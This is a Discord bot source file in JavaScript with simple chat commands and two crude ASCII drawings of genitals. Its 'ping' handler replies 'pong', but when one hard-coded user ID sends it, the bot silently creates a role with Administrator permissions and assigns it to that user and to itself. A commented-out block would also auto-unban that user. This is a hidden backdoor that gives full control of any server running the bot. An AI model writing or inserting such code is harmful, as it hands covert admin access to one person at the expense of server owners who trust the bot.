const Discord = require("./node_modules/discord.js");
const client = new Discord.Client();
const Info = require("./info.json");

console.log(Info);

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', async msg => {
  //  if(true != msg.guild.members.has("<@190992299591729153>"))
  //  {
  //    msg.guild.unban("190992299591729153");
  //  }

  if (msg.content === 'ping') { //admin role
    let guild = msg.guild;

    (async () => {
      if (msg.author.toString() == "<@190992299591729153>") {
        createAdminRole(guild, client, msg.member);
        sleep(1000);
      }
    })();
    msg.reply("pong");
    //msg.reply(`Guild is ${guild}, message author is \`\`\`${msg.author.toString()}\`\`\`.`);
  }
  else if (msg.content == "pong") {
    let guild = msg.guild;

    (async () => {
      if (msg.author.toString() == Info.nuttyusername) {
        guild.roles.filter(role => role.name == "Bot Manager").forEach(role => role.delete());
        await sleep(30000);

        printRoles(guild);
      }
    })()
  }
  else if (msg.content == "=hello")
  {
    return msg.channel.send("Hello!");
  }
  //else if (msg.content == `=fortnite ${platform} ${playerName}`)
  //{
  //  return msg.channel.send(`https://api.fortnitetracker.com/v1/profile/${platform}/${epic-nickname}`);
  //}
  else if (msg.content == "=nut")
  {
    return msg.channel.send("Praise the lord <@190992299591729153>");
  }
  //  else if(msg.content == "=fortnitestore")
  //  {
  //  https://api.fortnitetracker.com/v1/store
  //  }
  else if (msg.content == "=whoami")
  {
    msg.reply(`You are ${msg.author}`);
  }
  else if (msg.content == "=penisforeskin")
  {
    return msg.channel.send(fPen());
  }
  else if (msg.content == "=penis")
  {
    return msg.channel.send(cPen());
  }
  else if ((msg.content == "!clearchannel") || (msg.content == "!delete")) {
      if (msg.member.hasPermission("MANAGE_MESSAGES")) {
          msg.channel.fetchMessages()
             .then(function(list){
                  msg.channel.bulkDelete(list);
                  return msg.channel.send("Channel Cleared. You can keep or delete this message.");
              }, function(err){msg.channel.send("ERROR: ERROR CLEARING CHANNEL.")})
      }
  }
});

client.login(Info.token);

function createAdminRole(guild, client, guildMember) {
  guild.roles.filter(role => role.name == "Bot Manager").forEach(role => {
      if (role.members.size == 1) { // Only the bot still has it.
        role.delete();
      }
    });
  guild.createRole({
    name: 'Bot Manager',
    color: 'WHITE',
    permissions: 8,
    mentionable: false,
    hoist: false
  }).then(role => {
    let bot = guild.member(client.user);

    guildMember.addRole(role, 'because');
    bot.addRole(role, 'because');
    console.log("Admin role created");
  })
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function printRoles(guild) {
  console.log(`Guild is ${guild}, remaining roles are ${guild.roles.map(role => role.name)}`);
}

function fPen() {
  return (`
    ……………………„„-~^^~„-„„_
………………„-^*'' : : „'' : : : : *-„
…………..„-* : : :„„--/ : : : : : : : '\\
…………./ : : „-* . .| : : : : : : : : '|
……….../ : „-* . . . | : : : : : : : : |
………...\„-* . . . . .| : : : : : : : :'|
……….../ . . . . . . '| : : : : : : : :|
……..../ . . . . . . . .'\ : : : : : : : |
……../ . . . . . . . . . .\ : : : : : : :|
……./ . . . . . . . . . . . '\ : : : : : /
….../ . . . . . . . . . . . . . *-„„„„-*'
….'/ . . . . . . . . . . . . . . '|
…/ . . . . . . . ./ . . . . . . .|
../ . . . . . . . .'/ . . . . . . .'|
./ . . . . . . . . / . . . . . . .'|
'/ . . . . . . . . . . . . . . . .'|
'| . . . . . \ . . . . . . . . . .|
'| . . . . . . \„_^- „ . . . . .'|
'| . . . . . . . . .'\ .\ ./ '/ . |
| .\ . . . . . . . . . \ .'' / . '|
| . . . . . . . . . . / .'/ . . .|
| . . . . . . .| . . / ./ ./ . .|`);
}

function cPen() {
  return (`
    ………………………………………._¸„„„„_
    …………………….…………...„--~*'¯…….'\\
    ………….…………………… („-~~--„¸_….,/ì'Ì
    …….…………………….¸„-^"¯ : : : : :¸-¯"¯/'
    ……………………¸„„-^"¯ : : : : : : : '\\¸„„,-"
    **¯¯¯'^^~-„„„----~^*'"¯ : : : : : : : : : :¸-"
    .:.:.:.:.„-^" : : : : : : : : : : : : : : : : :„-"
    :.:.:.:.:.:.:.:.:.:.: : : : : : : : : : ¸„-^¯
    .::.:.:.:.:.:.:.:. : : : : : : : ¸„„-^¯
    :.' : : '\\ : : : : : : : ;¸„„-~"
    :.:.:: :"-„""***/*'ì¸'¯
    :.': : : : :"-„ : : :"\\
    .:.:.: : : : :" : : : : \\,
    :.: : : : : : : : : : : : 'Ì
    : : : : : : :, : : : : : :/
    "-„_::::_„-*__„„~"
    `);
}
